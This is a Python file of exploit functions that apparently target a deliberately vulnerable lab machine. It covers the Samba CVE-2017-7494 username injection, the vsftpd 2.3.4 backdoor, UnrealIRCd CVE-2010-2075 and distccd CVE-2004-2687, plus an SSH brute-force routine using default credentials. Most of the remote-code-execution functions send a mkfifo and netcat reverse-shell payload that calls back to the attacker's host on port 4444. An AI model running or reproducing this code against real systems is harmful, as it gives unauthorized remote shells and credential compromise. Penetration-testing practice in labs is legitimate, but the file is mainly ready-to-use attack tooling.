from smb.SMBConnection import *
import time
from helpers import *
import paramiko
import sys
import time

def exploitSamba(rhost, lhost):
    print("Exploiting Samba 3.x/4.x (CVE-2017-7494) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lhost} 4444 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    # This is the complete payload
    payload = pipe + ncSetup + shellSetup + cleanup

    # This version of Samba does not ensure that usernames do not contain malicious code when implemented
    # This allows us to set our payload as our Username and send it to the targeted machine
    username = "`" + payload + "`"

    print("Payload Sent")

    # SMBConnection allows us to initialize a connection over the SMB protocol
    # username is used as our username to authenticate ourself with the remote Samba server
    conn = SMBConnection(username, " ", " ", " ")

    # attempt the connection with the targeted machine
    conn.connect(rhost, 445, timeout=3)

    print("Success! Check Netcat!")

def exploitVSFTP(rhost):
    print("Exploiting vsftpd 2.3.4 backdoor (CVE-2011-2523) ")

    # Create an interactive Terminal by using netcat and opening a shell
    interactiveTerminal(rhost)
    time.sleep(3)  # Wait for Netcat to start

    try:
        print('Attempting Backdoor')

        # Establish connection to the FTP service and trigger the backdoor
        with socket.create_connection((rhost, 21), timeout=3) as ftpSock:
            ftpSock.sendall(b'USER EasyAccess:)\n')
            ftpSock.sendall(b'PASS ThankYou\n')
        print('Triggered Backdoor')

    # catch the exception
    except Exception as e:
        print(f'Failed to trigger backdoor on {rhost}: {e}')
        return

   
def exploitUnrealIRCd(rhost, lhost):

    print("Exploiting UnrealIRCd (CVE-2010-2075) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lhost} 4444 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    # This is the complete payload
    payload = f'AB; {pipe}{ncSetup}{shellSetup}{cleanup}'
    
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect the socket to the remote host that we have defined
        sock.connect((rhost, int(6667)))
        print(f"Connected to {rhost}:{6667}")

        # This will send the payload after converting it to bytes
        sock.send(payload.encode('utf-8'))
        print("Payload sent successfully. Check your listener for a shell.")

        # Now we close the connection
        sock.close()

    except socket.timeout:
        print("Connection timed out.")
        sys.exit(1)

    except ConnectionRefusedError:
        print("Connection refused.")
        sys.exit(1)

    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

def exploitBruteForce(rhost):

    print("SSH Brute Force Attempt")

    # Lists of usernames and passwords
    usernames = ["root", "msfadmin", "user"]
    passwords = ["password", "msfadmin", "user"]

    # Create an object to manage the SSH connection
    client = paramiko.SSHClient()
    # Automatically add the host key of the remote system to our system for first time connections using SSH
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                # Connect to the client using the current username and password
                client.connect(rhost, 22, username, password)
                print(f"Connection Successful to {rhost} with username: {username} and password: {password}")

                # Create an interactive shell over the SSH connection
                shellSession = client.invoke_shell()

                # Ask for user input to execute on the remote machine
                while True:
                    command = input("Enter Commands ('exit' to quit): ")
                    if command.lower() == 'exit':
                        break
                    
                    # Send the command
                    shellSession.send(command + "\n")

                    # Wait for the command execution
                    time.sleep(2)

                    # Send the output back to the local host
                    while shellSession.recv_ready():
                        output = shellSession.recv(1024).decode('utf-8')
                        sys.stdout.write(output)
                
                # Close the connection
                client.close()
                
                # Exit 
                print("Successful login, exiting now...")
                return True
            
            except paramiko.AuthenticationException:
                print(f"Authentication failed for username: {username} and password: {password}")
                continue

            except Exception as e:
                print(f"Error with username: {username} and password: {password} - {e}")
                continue

            finally:
                # Close the client
                client.close()

    print("There were no matching usernames and passwords")

    return False


def exploitDistccd(rHost, lHost):
    
    print("Exploiting distccd (CVE-2004-2687) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    port = 3632
    
    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lHost} 4444 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    # combine the total payload to be sent
    completePayload = f'{pipe}{ncSetup}{shellSetup}{cleanup}'
    
    # Used to run the completePayload in a shell on the target machine
    # This tricks distccd to think that this is a compile
    args = ["sh", "-c", completePayload]

    # DIST00000001ARGC is a fixed identifier
    # This code runs the completed arguments and formats them in hexidecimal
    payload = f"DIST00000001ARGC{len(args):08x}" + "".join(f"ARGV{len(arg):08x}{arg}" for arg in args)
    
    # Create a socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

        # Stop trying to connect after 5 seconds
        socket.setdefaulttimeout(5)

        # Try to connect to the rHost on the given port
        if sock.connect_ex((rHost, port)) == 0:
            print("Connected!")
            try:

                # Sends the specifically formated code 
                sock.send(payload.encode())
                sock.send(f"DOTI0000000A{randomTextGen(10)}".encode())

                # recieves the output from the socket
                sock.recv(100)

                print("Buffer Start\n")

                # Reads from both the STDERR and STDOUT
                for _ in range(2):
                    buffer = readOutput(sock)
                    if buffer:

                        # print to terminal
                        print(buffer.decode())
                    
                print("\nBuffer End")

                print("Completed.")

            except (socket.timeout, socket.error, Exception) as e:
                print(f"Error: {e}")
        else:
            print(f"Failed to connect to {rHost} on port {port}")
